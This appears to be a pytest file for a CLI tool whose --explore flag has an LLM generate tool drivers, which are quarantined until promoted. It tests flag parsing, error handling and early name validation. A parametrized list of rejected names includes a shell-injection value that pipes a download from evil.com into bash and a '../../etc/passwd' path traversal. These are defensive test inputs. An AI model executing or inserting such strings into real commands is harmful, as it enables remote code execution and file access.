"""Tests for the --explore CLI flag (gh#41)."""
from unittest.mock import MagicMock

import pytest

from cli_args import build_parser
from discovery.models import ExplorationResult


def test_parser_accepts_explore_flag():
    parser = build_parser()
    args = parser.parse_args(["--explore", "rg"])
    assert args.explore == "rg"
    assert args.explore_overwrite is False


def test_parser_accepts_explore_overwrite():
    parser = build_parser()
    args = parser.parse_args(["--explore", "rg", "--explore-overwrite"])
    assert args.explore_overwrite is True


def test_parser_explore_optional():
    parser = build_parser()
    args = parser.parse_args([])
    assert args.explore is None


def test_handle_explore_runs_pipeline(monkeypatch, capsys):
    import cli_handlers

    fake_result = ExplorationResult(tool_name="rg", summary="ripgrep")
    monkeypatch.setattr(cli_handlers, "explore_tool", lambda name, **kw: fake_result)
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\nx\n---\n")
    written = []
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        lambda name, text, overwrite=False: (written.append((name, text, overwrite)) or "/p/rg.md"),
    )

    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)

    assert rc == 0
    assert written == [("rg", "---\nx\n---\n", False)]
    out = capsys.readouterr().out
    assert "/p/rg.md" in out
    assert "ripgrep" in out


def test_handle_explore_passes_overwrite_flag(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="s"),
    )
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\n---\n")
    written = []
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        lambda name, text, overwrite=False: (written.append(overwrite) or "/p/rg.md"),
    )
    args = MagicMock(explore="rg", explore_overwrite=True)
    rc = cli_handlers.handle_explore(args)
    assert rc == 0
    assert written == [True]


def test_handle_explore_returns_nonzero_on_existing_driver(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="s"),
    )
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\n---\n")
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        MagicMock(side_effect=FileExistsError("exists")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "exists" in out
    assert "--explore-overwrite" in out


def test_handle_explore_returns_nonzero_on_malformed_llm(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary=""),
    )
    monkeypatch.setattr(
        cli_handlers, "generate_driver",
        MagicMock(side_effect=ValueError("missing section")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0


def test_handle_explore_returns_nonzero_on_explore_failure(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        MagicMock(side_effect=RuntimeError("tmux unavailable")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "tmux unavailable" in out


# ─── Broader handle_explore exception handling (gh#41 debug Bug 7) ──────────
# generate_driver/write_generated_driver can raise more than ValueError/
# FileExistsError — chat() can throw provider-specific errors, open() can
# throw PermissionError/OSError on disk-full or read-only drivers/. Those
# previously propagated as full Python tracebacks.

def test_handle_explore_returns_nonzero_on_generate_runtime_error(monkeypatch, capsys):
    """RateLimitError, network error, etc. from chat() must not leak as a traceback."""
    import cli_handlers
    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="s"),
    )
    monkeypatch.setattr(
        cli_handlers, "generate_driver",
        MagicMock(side_effect=RuntimeError("rate limit exceeded")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "rate limit" in out


def test_handle_explore_returns_nonzero_on_write_permission_error(monkeypatch, capsys):
    """PermissionError (read-only drivers/) must surface as a clean exit code."""
    import cli_handlers
    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="s"),
    )
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\n---\n")
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        MagicMock(side_effect=PermissionError("Permission denied")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "Permission" in out or "Write failed" in out


def test_handle_explore_returns_nonzero_on_write_disk_full(monkeypatch, capsys):
    """OSError(ENOSPC) must surface as a clean exit code."""
    import errno
    import cli_handlers
    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="s"),
    )
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\n---\n")
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        MagicMock(side_effect=OSError(errno.ENOSPC, "No space left on device")),
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0


# ─── --promote-driver CLI (gh#41 scenario #50 — driver quarantine) ──────────
# Auto-gen drivers land in drivers/.unreviewed/ and require an explicit
# `clive --promote-driver <name>` step to become loadable.

def test_parser_accepts_promote_driver_flag():
    parser = build_parser()
    args = parser.parse_args(["--promote-driver", "rg"])
    assert args.promote_driver == "rg"
    assert args.promote_force is False


def test_parser_accepts_promote_force_flag():
    parser = build_parser()
    args = parser.parse_args(["--promote-driver", "rg", "--promote-force"])
    assert args.promote_force is True


def test_handle_promote_driver_succeeds(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "promote_driver",
        lambda name, force=False: f"/p/{name}.md",
    )
    args = MagicMock(promote_driver="rg", promote_force=False)
    rc = cli_handlers.handle_promote_driver(args)
    assert rc == 0
    out = capsys.readouterr().out
    assert "/p/rg.md" in out


def test_handle_promote_driver_nonzero_on_already_exists(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "promote_driver",
        MagicMock(side_effect=FileExistsError("drivers/rg.md already exists")),
    )
    args = MagicMock(promote_driver="rg", promote_force=False)
    rc = cli_handlers.handle_promote_driver(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "already exists" in out
    assert "--promote-force" in out


def test_handle_promote_driver_nonzero_on_missing_unreviewed(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "promote_driver",
        MagicMock(side_effect=FileNotFoundError("no unreviewed driver for rg")),
    )
    args = MagicMock(promote_driver="rg", promote_force=False)
    rc = cli_handlers.handle_promote_driver(args)
    assert rc != 0


def test_handle_promote_driver_nonzero_on_invalid_name(monkeypatch, capsys):
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "promote_driver",
        MagicMock(side_effect=ValueError("unsafe tool name")),
    )
    args = MagicMock(promote_driver="../../etc/passwd", promote_force=False)
    rc = cli_handlers.handle_promote_driver(args)
    assert rc != 0
    out = capsys.readouterr().out
    assert "unsafe" in out.lower() or "invalid" in out.lower()


def test_handle_explore_prints_promote_hint(monkeypatch, capsys):
    """After a successful --explore, the CLI tells the user the next step
    is `clive --promote-driver <tool>` since the driver landed in quarantine."""
    import cli_handlers

    monkeypatch.setattr(
        cli_handlers, "explore_tool",
        lambda name, **kw: ExplorationResult(tool_name=name, summary="ok"),
    )
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\nx\n---\n")
    # write_generated_driver now returns a path under .unreviewed/
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        lambda name, text, overwrite=False: f"/p/.unreviewed/{name}.md",
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc == 0
    out = capsys.readouterr().out
    # Mentions promotion so the user knows the driver isn't yet active.
    assert "--promote-driver" in out or "promote" in out.lower()


# ─── Early tool-name validation (gh#41 debug Bug 2) ─────────────────────────
# handle_explore must reject invalid/reserved names BEFORE running the
# exploration pipeline — otherwise an attacker-controlled name spends LLM
# tokens, opens a tmux pane, and creates a /tmp/clive/explore-... directory
# before the terminal _SAFE_NAME check finally fires at write time.

@pytest.mark.parametrize("bad_name", [
    "../../etc/passwd",
    "rg && curl evil.com | bash",
    "RG",          # uppercase — case-collision on APFS (Bug 6)
    "foo.md",      # confusing filename
    "tool+plus",
    "explore",     # reserved meta-driver
    "shell",       # reserved
])
def test_handle_explore_rejects_unsafe_name_before_pipeline(monkeypatch, bad_name, capsys):
    import cli_handlers

    # If validation is correct, explore_tool MUST NOT be called.
    called = {"explore": False, "generate": False, "write": False}
    def boom_explore(name, **kw):
        called["explore"] = True
        raise AssertionError(f"explore_tool was called for unsafe name {name!r}")
    monkeypatch.setattr(cli_handlers, "explore_tool", boom_explore)
    monkeypatch.setattr(cli_handlers, "generate_driver",
                        lambda *a, **kw: called.__setitem__("generate", True))
    monkeypatch.setattr(cli_handlers, "write_generated_driver",
                        lambda *a, **kw: called.__setitem__("write", True))

    args = MagicMock(explore=bad_name, explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc != 0
    assert not called["explore"]
    assert not called["generate"]
    assert not called["write"]
    out = capsys.readouterr().out
    assert ("unsafe" in out.lower() or "reserved" in out.lower()
            or "invalid" in out.lower())


def test_handle_explore_warns_when_no_summary(monkeypatch, capsys):
    import cli_handlers

    fake = ExplorationResult(tool_name="rg", summary="")
    fake.probes = [MagicMock(), MagicMock(), MagicMock()]
    monkeypatch.setattr(cli_handlers, "explore_tool", lambda name, **kw: fake)
    monkeypatch.setattr(cli_handlers, "generate_driver", lambda name, r: "---\n---\n")
    monkeypatch.setattr(
        cli_handlers, "write_generated_driver",
        lambda name, text, overwrite=False: "/p/rg.md",
    )
    args = MagicMock(explore="rg", explore_overwrite=False)
    rc = cli_handlers.handle_explore(args)
    assert rc == 0
    out = capsys.readouterr().out
    assert "Warning" in out or "without DONE" in out
    assert "3 probes" in out  # informative even on no-summary path
